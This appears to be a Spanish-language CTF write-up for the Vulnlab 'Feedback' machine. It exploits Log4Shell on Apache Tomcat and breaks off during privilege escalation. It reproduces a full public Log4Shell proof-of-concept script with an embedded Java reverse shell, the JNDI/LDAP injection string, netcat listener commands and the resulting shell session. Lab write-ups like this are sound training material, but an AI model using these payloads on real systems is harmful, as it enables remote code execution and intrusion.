@@ -1,0 +1,592 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Vulnlab - FeedBack · MiguelRega7</title>
+<meta name="description" content="- En este post vamos a resolver la máquina Feedback de la plataforma de Vulnlab en la cual vamos a explotar una vulnerabilidad conocida llamada log4shell qué salió en el año 2021 q"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">VulnLab</span><h1>Vulnlab - FeedBack</h1><div class="meta"><span>◷</span><time>2024-03-22</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- En este post vamos a resolver la máquina Feedback de la plataforma de Vulnlab en la cual vamos a explotar una vulnerabilidad conocida llamada log4shell qué salió en el año 2021 q.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeracion-puerto-8080">Enumeracion puerto 8080</a><a href="#log4shell">Log4Shell</a><a href="#shell-as-tomcat">Shell as tomcat</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#shell-as-root">Shell as root</a><a href="#extra-info">Extra info</a></aside><article class="article-content" id="top"><p align="center">
+<img src="/assets/vulnlab/img/machines/feedback/icon.png">
+</p>
+
+<ul>
+<li>En este post vamos a resolver la máquina Feedback de la plataforma de Vulnlab en la cual vamos a explotar una vulnerabilidad conocida llamada log4shell qué salió en el año 2021 que afecta a la biblioteca de registro Apache Log4j esta vulnerabilidad se va a explotar gracias a que se está utilizando un servicio web con Tomcat obtendremos RCE gracias a esta vulnerabilidad para la escalada de privilegios gracias a un archivo de configuración podremos ver la contraseña del usuario root y simplemente migraremos a ese usuario.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong> y sus tecnologías que están corriendo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sCV -p22,8080 10.10.121.97 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 10:33 CST
+Nmap scan report for 10.10.121.97
+Host is up (0.16s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 d7:5e:41:c7:8d:0a:68:1f:7d:cd:01:32:5d:70:09:1e (RSA)
+|   256 fb:95:c3:2d:d4:fb:c9:cd:25:e6:52:17:e7:dc:3c:ff (ECDSA)
+|_  256 78:e0:8c:58:d3:01:42:82:5a:47:95:6c:72:49:36:35 (ED25519)
+8080/tcp open  http    Apache Tomcat 9.0.56
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/9.0.56
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<h2 id="enumeracion-puerto-8080">Enumeracion puerto 8080</h2>
+<ul>
+<li>Vemos que en el puerto <strong>8080</strong> está corriendo un servicio web que es <strong>Apache Tomcat 9.0.56</strong>.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">➜  nmap whatweb http://10.10.121.97:8080
+http://10.10.121.97:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.121.97], Title[Apache Tomcat/9.0.56]
+</code></pre></div></div>
+<ul>
+<li>De momento vemos que no hay ningún subdominio.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap curl -I http://10.10.121.97:8080
+HTTP/1.1 200
+Content-Type: text/html;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Sat, 23 Mar 2024 16:36:52 GMT
+</code></pre></div></div>
+<ul>
+<li>Esta es la página web:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/jz7DNHD.png">
+</p>
+
+<ul>
+<li>Vamos a hacer <strong>fuzzing</strong> para descubrir nuevas rutas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap gobuster dir -u http://10.10.121.97:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 80 --no-error
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.121.97:8080
+[+] Method:                  GET
+[+] Threads:                 80
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/docs                 (Status: 302) [Size: 0] [--&gt; /docs/]
+/feedback             (Status: 302) [Size: 0] [--&gt; /feedback/]
+/examples             (Status: 302) [Size: 0] [--&gt; /examples/]
+/manager              (Status: 302) [Size: 0] [--&gt; /manager/]
+</code></pre></div></div>
+<ul>
+<li>Vemos rutas interesantes que nos reportan un <strong>302</strong>. Vamos a examinar su contenido.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/BCKmysa.png">
+</p>
+
+<p align="center">
+<img src="https://i.imgur.com/DJ5rxwp.png">
+</p>
+
+<p align="center">
+<img src="https://i.imgur.com/w4gaiZ9.png">
+</p>
+
+<h2 id="log4shell">Log4Shell</h2>
+<ul>
+<li>Bueno, esta ruta ya es interesante.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/6rmzBT2.png">
+</p>
+
+<ul>
+<li>Vemos que nos deja ingresar data, vamos a capturar la petición con <strong>Burpsuite</strong> para ver cómo va todo por detrás.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/hSChmGm.png">
+</p>
+
+<ul>
+<li>Y aquí vemos la petición y un campo muy interesante.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/gzI8BQn.png">
+</p>
+
+<ul>
+<li>Si examinamos el código fuente de la página web, vemos lo siguiente:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/8T0nY1v.png">
+</p>
+
+<ul>
+<li>Vamos a explotar una vulnerabilidad muy conocida que se llama <strong>Log4Shell</strong> <a href="https://www.ibm.com/mx-es/topics/log4j">https://www.ibm.com/mx-es/topics/log4j</a> .</li>
+</ul>
+<blockquote>
+<p>Log4Shell se refiere a una vulnerabilidad crítica de seguridad que afecta a Log4j, una biblioteca de registro de eventos de Java ampliamente utilizada. La vulnerabilidad, oficialmente denominada CVE-2021-44228, permite a un atacante ejecutar código arbitrario en un sistema afectado simplemente enviando un mensaje de registro especialmente diseñado. Esto puede conducir a una variedad de ataques, incluidos la ejecución remota de código, el acceso no autorizado a sistemas y datos sensibles, y el secuestro de aplicaciones.</p>
+</blockquote>
+<ul>
+<li><p>Podemos usar el siguiente <strong>poc</strong> <a href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a> .</p>
+</li>
+<li><p>Algo que tenemos que hacer es descargar el <strong>JDK</strong>, ya que todo esto funciona con <strong>java</strong> <a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content git clone https://github.com/kozmer/log4j-shell-poc
+Cloning into 'log4j-shell-poc'...
+remote: Enumerating objects: 52, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Compressing objects: 100% (12/12), done.
+remote: Total 52 (delta 0), reused 1 (delta 0), pack-reused 40
+Receiving objects: 100% (52/52), 38.74 MiB | 1.37 MiB/s, done.
+Resolving deltas: 100% (7/7), done.
+</code></pre></div></div>
+<ul>
+<li>Y listo, ahora tenemos todo correcto para comenzar con la explotación de esta vulnerabilidad.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  log4j-shell-poc git:(main) mv /home/miguel/Downloads/jdk-8u202-linux-x64.tar.gz .
+➜  log4j-shell-poc git:(main) tar -xf jdk-8u202-linux-x64.tar.gz
+➜  log4j-shell-poc git:(main) ./jdk1.8.0_202/bin/java -version
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+java version &quot;1.8.0_202&quot;
+Java(TM) SE Runtime Environment (build 1.8.0_202-b08)
+Java HotSpot(TM) 64-Bit Server VM (build 25.202-b08, mixed mode)
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a instalar los <code>requirements.txt</code> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  log4j-shell-poc git:(main) ✗ pip install -r requirements.txt
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.4.6)
+Collecting argparse (from -r requirements.txt (line 2))
+  Downloading argparse-1.4.0-py2.py3-none-any.whl.metadata (2.8 kB)
+Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
+Installing collected packages: argparse
+Successfully installed argparse-1.4.0
+</code></pre></div></div>
+<ul>
+<li>Ahora nos vamos a poner en escucha con <strong>netcat</strong> para que nos llegue la <strong>shell</strong> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  log4j-shell-poc git:(main) ✗ sudo nc -nvlp 443
+[sudo] password for miguel:
+listening on [any] 443 ...
+</code></pre></div></div>
+<ul>
+<li>Este es el exploit que se utiliza:</li>
+</ul>
+<div class="code-window" data-language="Python"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Python</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-python">#!/usr/bin/env python3
+
+import argparse
+from colorama import Fore, init
+import subprocess
+import threading
+from pathlib import Path
+import os
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+
+CUR_FOLDER = Path(__file__).parent.resolve()
+
+
+def generate_payload(userip: str, lport: int) -&gt; None:
+    program = &quot;&quot;&quot;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class Exploit {
+
+    public Exploit() throws Exception {
+        String host=&quot;%s&quot;;
+        int port=%d;
+        String cmd=&quot;/bin/sh&quot;;
+        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+        Socket s=new Socket(host,port);
+        InputStream pi=p.getInputStream(),
+            pe=p.getErrorStream(),
+            si=s.getInputStream();
+        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+        while(!s.isClosed()) {
+            while(pi.available()&gt;0)
+                so.write(pi.read());
+            while(pe.available()&gt;0)
+                so.write(pe.read());
+            while(si.available()&gt;0)
+                po.write(si.read());
+            so.flush();
+            po.flush();
+            Thread.sleep(50);
+            try {
+                p.exitValue();
+                break;
+            }
+            catch (Exception e){
+            }
+        };
+        p.destroy();
+        s.close();
+    }
+}
+&quot;&quot;&quot; % (userip, lport)
+
+    # writing the exploit to Exploit.java file
+
+    p = Path(&quot;Exploit.java&quot;)
+
+    try:
+        p.write_text(program)
+        subprocess.run([os.path.join(CUR_FOLDER, &quot;jdk1.8.0_20/bin/javac&quot;), str(p)])
+    except OSError as e:
+        print(Fore.RED + f'[-] Something went wrong {e}')
+        raise e
+    else:
+        print(Fore.GREEN + '[+] Exploit java class created success')
+
+
+def payload(userip: str, webport: int, lport: int) -&gt; None:
+    generate_payload(userip, lport)
+
+    print(Fore.GREEN + '[+] Setting up LDAP server\n')
+
+    # create the LDAP server on new thread
+    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
+    t1.start()
+
+    # start the web server
+    print(f&quot;[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}&quot;)
+    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
+    httpd.serve_forever()
+
+
+def check_java() -&gt; bool:
+    exit_code = subprocess.call([
+        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
+        '-version',
+    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    return exit_code == 0
+
+
+def ldap_server(userip: str, lport: int) -&gt; None:
+    sendme = &quot;${jndi:ldap://%s:1389/a}&quot; % (userip)
+    print(Fore.GREEN + f&quot;[+] Send me: {sendme}\n&quot;)
+
+    url = &quot;http://{}:{}/#Exploit&quot;.format(userip, lport)
+    subprocess.run([
+        os.path.join(CUR_FOLDER, &quot;jdk1.8.0_20/bin/java&quot;),
+        &quot;-cp&quot;,
+        os.path.join(CUR_FOLDER, &quot;target/marshalsec-0.0.3-SNAPSHOT-all.jar&quot;),
+        &quot;marshalsec.jndi.LDAPRefServer&quot;,
+        url,
+    ])
+
+
+def main() -&gt; None:
+    init(autoreset=True)
+    print(Fore.BLUE + &quot;&quot;&quot;
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+&quot;&quot;&quot;)
+
+    parser = argparse.ArgumentParser(description='log4shell PoC')
+    parser.add_argument('--userip',
+                        metavar='userip',
+                        type=str,
+                        default='localhost',
+                        help='Enter IP for LDAPRefServer &amp; Shell')
+    parser.add_argument('--webport',
+                        metavar='webport',
+                        type=int,
+                        default='8000',
+                        help='listener port for HTTP port')
+    parser.add_argument('--lport',
+                        metavar='lport',
+                        type=int,
+                        default='9001',
+                        help='Netcat Port')
+
+    args = parser.parse_args()
+
+    try:
+        if not check_java():
+            print(Fore.RED + '[-] Java is not installed inside the repository')
+            raise SystemExit(1)
+        payload(args.userip, args.webport, args.lport)
+    except KeyboardInterrupt:
+        print(Fore.RED + &quot;user interrupted the program.&quot;)
+        raise SystemExit(0)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div></div>
+<ul>
+<li><p>Este es el exploit que automatiza la explotación de la vulnerabilidad <strong>Log4Shell</strong>. Genera un exploit en java y usa <strong>LDAP</strong> y <strong>HTTP</strong> para desencadenar la ejecución del exploit, el exploit de <strong>java</strong> establece una conexión con el servidor <strong>LDAP</strong> y ejecuta la <strong>shell</strong>. Vamos a seguir los pasos que nos indican.</p>
+</li>
+<li><p>Si les pasa este error, simplemente cambian el nombre y listo.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  log4j-shell-poc git:(main) ✗ python3 poc.py --userip 10.8.1.127 --webport 8000 --lport 443
+
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+
+Traceback (most recent call last):
+  File &quot;/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py&quot;, line 144, in &lt;module&gt;
+    main()
+  File &quot;/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py&quot;, line 134, in main
+    if not check_java():
+           ^^^^^^^^^^^^
+  File &quot;/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/poc.py&quot;, line 86, in check_java
+    exit_code = subprocess.call([
+                ^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.11/subprocess.py&quot;, line 389, in call
+    with Popen(*popenargs, **kwargs) as p:
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.11/subprocess.py&quot;, line 1026, in __init__
+    self._execute_child(args, executable, preexec_fn, close_fds,
+  File &quot;/usr/lib/python3.11/subprocess.py&quot;, line 1953, in _execute_child
+    raise child_exception_type(errno_num, err_msg, err_filename)
+FileNotFoundError: [Errno 2] No such file or directory: '/home/miguel/Vulnlab/Feedback/content/log4j-shell-poc/jdk1.8.0_20/bin/java'
+➜  log4j-shell-poc git:(main) ✗ ls
+Dockerfile  README.md     poc.py            target
+LICENSE     jdk1.8.0_202  requirements.txt  vulnerable-application
+➜  log4j-shell-poc git:(main) ✗ mv jdk1.8.0_202 jdk1.8.0_20
+</code></pre></div></div>
+<ul>
+<li>Ahora funciona.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  log4j-shell-poc git:(main) python3 poc.py --userip 10.8.1.127 --webport 8000 --lport 443
+
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+[+] Exploit java class created success
+[+] Setting up LDAP server
+
+[+] Send me: ${jndi:ldap://10.8.1.127:1389/a}
+
+[+] Starting Webserver on port 8000 http://0.0.0.0:8000
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Listening on 0.0.0.0:1389
+</code></pre></div></div>
+<ul>
+<li><p>Ahora nos dice que ejecutemos lo siguiente <code>Send me: ${jndi:ldap://10.8.1.127:1389/a}</code>, esta es una URL JNDI (Java Naming and Directory Interface) que apunta a un servidor LDAP.</p>
+</li>
+<li><p>Antes de enviarlo, vamos a convertirlo en <strong>URL-encoded</strong> .</p>
+</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/tboV7kX.png">
+</p>
+
+<ul>
+<li><p>Ahora lo Copeamos y modificamos la petición que tenemos con <strong>burpsuite</strong>.</p>
+</li>
+<li><p>Si enviamos la petición antes de poner la data, vemos que obtenemos esa respuesta, así que podemos basarnos en obtener algo similar para comprobar que funcione.</p>
+</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/86C57EP.png">
+</p>
+
+<ul>
+<li>Ahora en la parte de <strong>name</strong> pondremos todo:</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/C6P8ZHF.png">
+</p>
+
+<ul>
+<li>Y enviamos la petición.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/1zE3nfi.png">
+</p>
+
+<h2 id="shell-as-tomcat">Shell as tomcat</h2>
+<ul>
+<li>Y ahora nos llega la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  log4j-shell-poc git:(main) ✗ sudo nc -nvlp 443
+[sudo] password for miguel:
+listening on [any] 443 ...
+connect to [10.8.1.127] from (UNKNOWN) [10.10.121.97] 47262
+whoami
+tomcat
+</code></pre></div></div>
+<ul>
+<li>Vemos que sí se obtuvo una petición por parte del servidor.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  log4j-shell-poc git:(main) python3 poc.py --userip 10.8.1.127 --webport 8000 --lport 443
+
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+[+] Exploit java class created success
+[+] Setting up LDAP server
+
+[+] Send me: ${jndi:ldap://10.8.1.127:1389/a}
+
+[+] Starting Webserver on port 8000 http://0.0.0.0:8000
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Listening on 0.0.0.0:1389
+Send LDAP reference result for a redirecting to http://10.8.1.127:8000/Exploit.class
+10.10.121.97 - - [23/Mar/2024 11:40:17] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -
+</code></pre></div></div>
+<ul>
+<li>Ahora obtenemos una <strong>bash</strong> interactiva.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">python3 -c 'import pty;pty.spawn(&quot;bin/bash&quot;)'
+tomcat@ip-10-10-10-7:/$
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>Vemos el <strong>pkexec</strong>, pero no lo vamos a explotar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">tomcat@ip-10-10-10-7:/$ find / -perm -4000 2&gt;/dev/null | grep -v '/snap/'
+find / -perm -4000 2&gt;/dev/null | grep -v '/snap/'
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/newuidmap
+/bin/ping
+/bin/su
+/bin/fusermount
+/bin/umount
+/bin/mount
+tomcat@ip-10-10-10-7:/$
+</code></pre></div></div>
+<ul>
+<li>Vemos que hay un directorio <strong>conf</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">tomcat@ip-10-10-10-7:~$ ls -la
+ls -la
+total 156
+drwxr-xr-x 9 root   tomcat  4096 Dec 11  2021 .
+drwxr-xr-x 4 root   root    4096 Dec 11  2021 ..
+-rw-r----- 1 root   tomcat 18970 Dec  2  2021 BUILDING.txt
+-rw-r----- 1 root   tomcat  6210 Dec  2  2021 CONTRIBUTING.md
+-rw-r----- 1 root   tomcat 57092 Dec  2  2021 LICENSE
+-rw-r----- 1 root   tomcat  2333 Dec  2  2021 NOTICE
+-rw-r----- 1 root   tomcat  3378 Dec  2  2021 README.md
+-rw-r----- 1 root   tomcat  6898 Dec  2  2021 RELEASE-NOTES
+-rw-r----- 1 root   tomcat 16507 Dec  2  2021 RUNNING.txt
+drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 bin
+drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 conf
+drwxr-x--- 2 root   tomcat  4096 Dec 11  2021 lib
+drwxr-x--- 2 tomcat tomcat  4096 Mar 23 16:32 logs
+drwxr-x--- 2 tomcat tomcat  4096 Mar 23 16:32 temp
+drwxr-x--- 8 tomcat tomcat  4096 Dec 11  2021 webapps
+drwxr-x--- 3 tomcat tomcat  4096 Dec 11  2021 work
+tomcat@ip-10-10-10-7:~$
+</code></pre></div></div>
+<ul>
+<li>Y bueno, vemos un archivo interesante que se llama <strong>tomcat-users.xml</strong> con credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">tomcat@ip-10-10-10-7:~/conf$ ls -la
+ls -la
+total 240
+drwxr-x--- 2 root tomcat   4096 Dec 11  2021 .
+drwxr-xr-x 9 root tomcat   4096 Dec 11  2021 ..
+-rw-r----- 1 root tomcat  12953 Dec  2  2021 catalina.policy
